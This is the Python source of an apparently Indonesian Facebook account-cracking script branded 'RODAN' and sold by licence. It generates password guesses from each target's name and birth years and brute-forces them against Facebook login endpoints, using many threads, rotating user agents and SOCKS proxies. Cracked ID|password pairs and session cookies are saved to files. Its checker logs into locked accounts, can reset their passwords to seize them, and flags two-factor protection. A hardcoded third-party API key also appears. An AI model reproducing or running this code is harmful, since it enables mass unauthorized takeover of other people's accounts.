						pwv.append('12345678'+frs)
						pwv.append('112233'+frs)
						pwv.append('11223344'+frs)
						pwv.append('11223345'+frs)
						pwv.append('11223344')
						pwv.append('11223'+frs)
						pwv.append('1122334')
						pwv.append('12334'+frs)
				else:
					if len(frs)<3:
						pwv.append(nmf)
						pwv.append(nmf)
						pwv.append(frs+'2006')
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
					else:
						pwv.append(nmf)
						pwv.append(nmf)
						pwv.append(frs+'2006')
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print('')
	RODAN = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(RODAN, style='green'))
	woi = input(x+'['+p+'👽'+x+'] Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def babi():
	global prog,des
	print('')
	print(f'╰─ {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'╰─ {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'╰─ AIRPLANE MODE OPEN EVERY 500 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
						pwv.append(frs+'123321')
						pwv.append(frs+'1223')
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
						pwv.append(frs+'112233')
						pwv.append(frs+'123321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'1234567')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak('╰─ Sucses Cracked %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
		print('')
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white] THNS➳RODAN  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	for pw in pwv:
		try:
			ses.headers.update({'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=QzD7ZSvU_EKlA_QO3U-R-Lms; sb=QzD7Zfqv9Z90Qdq7n1dW5pUB; m_pixel_ratio=2.75; wd=393x720; ps_l=0; ps_n=0; fr=0OOApLaJkNDkK7v9z..Bl-zBD..AAA.0.0.Bl-zBO.AWXOg4JDZEw',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=QzD7ZSvU_EKlA_QO3U-R-Lms; sb=QzD7Zfqv9Z90Qdq7n1dW5pUB; m_pixel_ratio=2.75; wd=393x720; ps_l=0; ps_n=0; fr=0OOApLaJkNDkK7v9z..Bl-zBD..AAA.0.0.Bl-zBO.AWXOg4JDZEw',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'├──RAWA CP ID  : {kk}{idf}{P} \n│   └──  THNS CP PASS  : {kk}{pw}{P}\n└── User Agent  : {kk}{ua}{P} ')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'├── RAWA OK ID  : {hh}{idf}{P} \n│   └── RODAN OK PASS  : {hh}{pw} {P}\n└──  CookieS : {hh}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r (RODAN) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'[+]ID : {kk}{idf}{P} \n[+]PASSWORD : {kk}{pw}{P}\n[+]COOKIE  : {kk}{P} ')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'[+]ID : {hh}{idf}{P} \n[+]PASSWORD : {hh}{pw} {P}\n[+]COOKIE : {hh}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				
				
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        os.system("clear")
        none();time.sleep(1)
        print("")
        print("\033[0m╰─ Author: RODAN-DECODER ")
        print("\033[0m╰─ Telegram:@Thanatos_best ");time.sleep(2)
        print ("")
        jalan("\033[0m╰─ license anda :\033[32m "+crot);time.sleep(1)
        namamu = input("\033[0m╰─ nama anda : ")
        yt = input("\033[0m╰─ Chat Admin Untuk Beli Lisensi y/t? > ")
        if yt in ["Y","y"]:
            os.system("xdg-open https://wa.me/+6281322541?text=Assalamualaikum+bang+Meledak,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu)
            exit()
        else:
            exit("\033[0m╰─ Telah keluar program")
    try:
        confirmkey = requests.get("https://raw.githubusercontent.com/privatescrip/database/main/ya.json").json()
    except requests.exceptions.ConnectionError:
        print("\033[0m╰─ Jaringan Internet Kamu Tidak Ada");exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
            print("\n\033[0m╰─ Lisensi key Kamu Sudah Kadaluarsa")
            os.system("rm -rf .key.txt");exit()
        else:
        	print("\n\033[0m╰─ Lisensi key Kamu Sudah Aktif");time.sleep(1);login()
    else:
        print("\n\033[0m╰─ Lisensi key Kamu Sudah Kadaluarsa")
        os.system("rm -rf .key.txt");exit()

import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s [%s\033[0m \033[0mpilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
        
###----------[ AUTHOR ]---------- ###
Author = 'RODAN'
Version = 1.0

# --> Modules
import requests,bs4,sys,os,datetime,re
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
# -->  Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

# --> Waktu
def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\nProgram Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\nProgram Selesai Dalam Waktu 0 Detik\n')

# --> Main Program
class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input('Masukkan URL : ')
        print('\n[1] Source Payload')
        print('[2] Parsed Payload')
        print('[3] Source Code Post Requests')
        self.tanya = input('Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)

    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\nIsi  Yg Benar!')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        # --> Tampil Get Requests
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print("cookie = requests.Session().cookies.get_dict()")
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	login()

